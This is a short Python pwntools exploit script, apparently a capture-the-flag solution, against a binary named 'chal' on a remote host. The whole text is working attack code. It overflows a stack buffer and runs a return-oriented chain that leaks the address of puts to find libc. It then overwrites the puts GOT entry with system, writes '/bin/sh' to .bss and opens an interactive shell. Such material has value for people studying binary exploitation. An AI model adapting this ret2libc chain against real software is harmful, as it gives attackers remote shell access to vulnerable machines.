from pwn import *

# r = process('./chal')
r = remote('10.113.184.121', 10053)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.arch = 'amd64'

pop_rdi_ret = 0x0000000000401263
puts_got = 0x403368
puts_plt = 0x401070
gets_got = 0x403378
gets_plt = 0x401090
bss_addr = 0x403f00
payload = flat(
    # leak puts got address to calculate libc base address
    pop_rdi_ret,    puts_got,
    puts_plt,

    # fetch user input -> /bin/sh\x00
    pop_rdi_ret,    bss_addr,
    gets_plt,

    # fetch user input -> system address
    pop_rdi_ret,    puts_got,
    gets_plt,

    # system('/bin/sh\x00')
    pop_rdi_ret,    bss_addr,
    puts_plt
)
# raw_input()
r.sendlineafter(b'Try your best :', b'a' * 0x28 + payload)
print(r.recvline())

puts_addr = u64(r.recv(6).ljust(8, b'\x00'))
log.info(f"puts address = {hex(puts_addr)}")

libc_base = puts_addr - libc.symbols['puts']
libc.address = libc_base
system_addr = libc.symbols['system']
log.info(f'system address = {hex(system_addr)}')
r.sendline(b'/bin/sh\x00')
# raw_input()
r.sendline(p64(libc.symbols['system']))

r.interactive()